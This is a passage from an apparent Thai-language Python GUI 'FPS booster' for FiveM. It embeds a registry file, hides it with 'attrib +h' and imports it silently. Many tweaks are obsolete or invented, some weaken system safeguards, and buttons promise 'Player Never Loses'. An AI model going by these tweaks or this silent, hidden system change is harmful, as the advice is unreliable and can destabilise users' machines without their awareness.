[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
"NoLowDiskSpaceChecks"=dword:00000001
"LinkResolveIgnoreLinkInfo"=dword:00000001
"NoResolveSearch"=dword:00000001
"NoResolveTrack"=dword:00000001
"NoInternetOpenWith"=dword:00000001
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem]
"NtfsMftZoneReservation"=dword:00000001
"NTFSDisable8dot3NameCreation"=dword:00000001
"DontVerifyRandomDrivers"=dword:00000001
"NTFSDisableLastAccessUpdate"=dword:00000001
"ContigFileAllocSize"=dword:00000040
"creator"="Sincare#2267"
[HKEY_CURRENT_USER\Control Panel\Desktop]
"AutoEndTasks"="1"
"MenuShowDelay"="0"
"WaitToKillAppTimeout"="5000"
"WaitToKillServiceTimeout"="1000"
"HungAppTimeout"="4000"
"LowLevelHooksTimeout"="1000"
"ForegroundLockTimeout"="150000"
"creator"="Sincare#2267"
[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Games]
"FpsAll"=dword:00000001
"GameFluidity"=dword:00000001
"FpsStatusGames"=dword:00000010
"FpsStatusGamesAll"=dword:00000004
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games]
"Affinity"=dword:00000000
"Background Only"="False"
"Clock Rate"=dword:00002710
"GPU Priority"=dword:00000008
"Priority"=dword:00000002
"Scheduling Category"="High"
"SFIO Priority"="High"
"Latency Sensitive"="True"
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency]
"Affinity"=dword:00000000
"Background Only"="False"
"Clock Rate"=dword:00002710
"GPU Priority"=dword:00000008
"Priority"=dword:00000002
"Scheduling Category"="High"
"SFIO Priority"="High"
"Latency Sensitive"="True"
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\BIOS]
"CPUPriority"=dword:00000001
"FastDRAM"=dword:00000001
"PCIConcur"=dword:00000001
"AGPConcur"=dword:00000001
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer]
"Max Cached Icons"="2000"
"AlwaysUnloadDLL"=dword:00000001
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AlwaysUnloadDLL]
"Default"=dword:00000001
"creator"="Sincare#2267"
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
"EnableBalloonTips"=dword:00000000
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSMQ\Parameters]
"TCPNoDelay"=dword:00000001
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSMQ\Parameters]

"TCPNoDelay"=dword:0000001
"TcpNoDelay"=dword:0000001
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games]

"Scheduling Category"="High"
"SFIO Priority"="High"
"Background Only"="False"
"Priority"=dword:00000001
"Clock Rate"=dword:00002710
"GPU Priority"=dword:00000001
"Affinity"=dword:00000000
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency]

"Scheduling Category"="High"
"SFIO Priority"="High"
"Background Only"="False"
"Priority"=dword:00000001
"Latency Sensitive"="True"
"Clock Rate"=dword:00002710
"GPU Priority"=dword:00000002
"Affinity"=dword:00000000
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio]

"Scheduling Category"="High"
"SFIO Priority"="High"
"Background Only"="True"
"Priority"=dword:00000001
"Clock Rate"=dword:00002710
"GPU Priority"=dword:00000002
"Affinity"=dword:00000000
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio]

"Scheduling Category"="High"
"SFIO Priority"="High"
"Background Only"="False"
"Priority"=dword:00000001
"Clock Rate"=dword:00002710
"GPU Priority"=dword:00000005
"Affinity"=dword:00000000
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability]

"TimeStampInterval"=dword:00000000
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\cdrom]

"AutoRun"=dword:00000000
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\PriorityControl]

"IRQ8Priority"=dword:00000001
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanmanServer\Parameters]

"SizReqBuf"=dword:00004410
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LanmanWorkstation\Parameters]

"DisableBandwidthThrottling"=dword:00000001
"DisableLargeMtu"=dword:00000000
"MaxCmds"=dword:0000001e
"MaxThreads"=dword:0000001e
"MaxCollectionCount"=dword:0000020
"KeepConn"=dword:00015180
"creator"="Sincare#2267"




    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def bugtalk():
    webbrowser.open("https://discord.gg/TJ56eYqqSq")

lobby = Tk()
lobby.title("UnknowPlayer By ! Sonic . exe#6074")
lobby.geometry("700x500")
lobby.resizable(width=False, height=False)

notebook = ttk.Notebook(lobby)
tab1 = Frame(notebook)
tab2 = Frame(notebook)
tab3 = Frame(notebook)
tab4 = Frame(notebook)
tab5 = Frame(notebook)
tab6 = Frame(notebook)
notebook.add(tab1,text="Home")
notebook.add(tab2,text="Hardcore Mode Punch")
notebook.add(tab3,text="Player Never Loses")
notebook.add(tab4,text="Set Unknow Function")
notebook.add(tab6,text="แก้ปัญหาต่างๆ")

notebook.pack()
Label(tab1,text="UnknowPlayer V1",font=300).pack()
Label(tab1,text="รายละเอียดเกี่ยวกับตัวโปรแกรม",font=250).pack()
Label(tab1,text="เป็นที่ทราบกันดีโปรแกรมนี้ถูกจัดทำขึ้นโดย Sonic เหตุผลที่สร้างโปรแกรมนี้ขึ้นมา",font=180).pack()
Label(tab1,text="เพื่อให้ผู้เล่นที่คลั่งไคล้ในการใช้ Registry Editor แปลกใหม่ในวงการ Fivem",font=180).pack()
Label(tab1,text="ซึ่งผมเองก็เป็นคนคนหนึ่งที่ชอบการเขียนโปรแกรมเว็บไซต์แล้วเห็นว่าแปลกใหม่ดี",font=180).pack()
Label(tab1,text="เลยจะมาลองทำขายเพื่อนๆดูครับ",font=180).pack()
Label(tab1,text="คุณสมบัติของตัวโปรแกรม",font=250).pack()
Label(tab1,text="ลดหน่วง เพื่ม Fps บูทเน็ต ปรับดีเลย์เมาส์คีย์บอร์ดการปรับสภาพเครื่องให้ลื่น",font=180).pack()
Label(tab1,text="มี .meta ให้ใช้ลดหน่วงเต็มสูบ มีการปรับลดดีเลย์ทำให้เกาะแตกง่ายขึ้น",font=180).pack()
Label(tab1,text="พบเจอบัคกรุณาติดต่อ",font=250).pack()
Button(tab1,text="Discord",command=bugtalk).pack()

Label(tab2,text="Hardcore Mode Punch",font=300).pack()
Button(tab2,text="Punch performance",command=Hardcore1).pack()
Button(tab2,text="Punch Speed",command=Hardcore2).pack()
Button(tab2,text="Reduce click delay",command=Hardcore3).pack()
Button(tab2,text="No losing bet",command=Hardcore4).pack()
Button(tab2,text="Flow real punch",command=Hardcore5).pack()

Label(tab3,text="Player Never Loses",font=300).pack()
Button(tab3,text="Increase internet speed",command=Player1).pack()
Button(tab3,text="Bet Neverlose",command=Player2).pack()
Button(tab3,text="TCP style sincare",command=Player3).pack()
Button(tab3,text="Parameters style sincare",command=Player4).pack()

Label(tab4,text="Set Unknow Function",font=300).pack()
Button(tab4,text="Internet Booster",command=Unknow1).pack()
Button(tab4,text="Nua win free",command=Unknow2).pack()
Button(tab4,text="Close unnecessary programs",command=Unknow3).pack()
Button(tab4,text="Reg god",command=Unknow4).pack()

Label(tab6,text="การแก้ปัญหา",font=300).pack()
Label(tab6,text="กดใช้แล้วให้รีคอมทุกกรณี",font=300).pack()
Button(tab6,text="แก้เน็ตเข้า 2K หรือเข้าเว็บไม่ได้",command=fix1).pack()
Button(tab6,text="แก้เข้า Fivem จอกระพริบ",command=fix2).pack()

lobby.mainloop()